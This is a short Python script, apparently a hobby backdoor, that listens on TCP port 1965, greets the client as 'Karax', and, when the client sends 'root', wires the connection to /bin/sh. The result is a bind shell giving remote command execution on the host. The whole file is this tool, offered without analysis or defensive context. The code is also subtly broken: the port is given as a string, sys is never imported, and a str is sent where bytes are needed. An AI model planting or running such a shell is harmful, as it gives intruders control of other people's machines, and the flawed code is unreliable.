import socket
import os
import code

host = ""
port = "1965"
mot = ""

print(socket.gethostbyname(socket.gethostname()))
print("Creation du socket en cours...")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print("Creation du socket terminee !")
s.bind((host, port))
print("Lancement de l'écoute")
s.listen(1)
client,adresse = s.accept()
print(adresse)
print(client.getpeername())
client.send("Bonjour Karax : ")
mot = client.recv(1024)
root = "root\n"
print(mot)
while(1):
	if (mot == root):
		print("On est dans root ! ")
		for f in range(3):
			os.dup2(client.fileno(), f)
		os.execl("/bin/sh", "/bin/sh")
		code.interact()
		sys.exit()
	else:
		print("On sort")
		break
client.close()
s.close()
